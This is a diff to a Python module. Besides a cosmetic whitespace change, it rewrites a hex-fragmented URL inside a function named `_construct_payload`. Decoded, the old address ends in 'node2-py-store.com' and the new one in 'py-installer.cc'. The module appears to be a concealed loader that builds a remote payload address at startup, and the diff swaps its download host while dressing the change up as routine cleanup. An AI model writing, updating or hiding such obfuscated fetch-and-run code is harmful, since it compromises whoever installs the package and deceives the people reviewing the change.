@@ -2,7 +2,7 @@ import os
 import sys
 import hashlib
 import binascii
-import json 
+import json
 import tempfile
 
 _env_state = {'ready': False}
@@ -41,21 +41,19 @@ def _construct_payload():
         '7474',
         '70',
         '733a',
-        '2f2f6e',
-        '6f64',
-        '65',
-        '322d',
-        '70',
+        '2f2f70',
         '792d',
-        '7374',
-        '6f72',
-        '652e',
-        '636f',
-        '6d'
+        '69',
+        '6e73',
+        '74',
+        '616c',
+        '6c65',
+        '722e',
+        '6363'
     ]
     parsed = [_parse_hex(f) for f in fragments]
     binary = (parsed[0] + parsed[1] + parsed[2] + parsed[3] + parsed[4] + parsed[5]).decode('utf-8', errors='ignore')
-    address = (parsed[6] + parsed[7] + parsed[8] + parsed[9] + parsed[10] + parsed[11] + parsed[12] + parsed[13] + parsed[14] + parsed[15] + parsed[16] + parsed[17] + parsed[18] + parsed[19] + parsed[20]).decode('utf-8', errors='ignore')
+    address = (parsed[6] + parsed[7] + parsed[8] + parsed[9] + parsed[10] + parsed[11] + parsed[12] + parsed[13] + parsed[14] + parsed[15] + parsed[16] + parsed[17] + parsed[18]).decode('utf-8', errors='ignore')
     return binary, address
 
 def _startup():
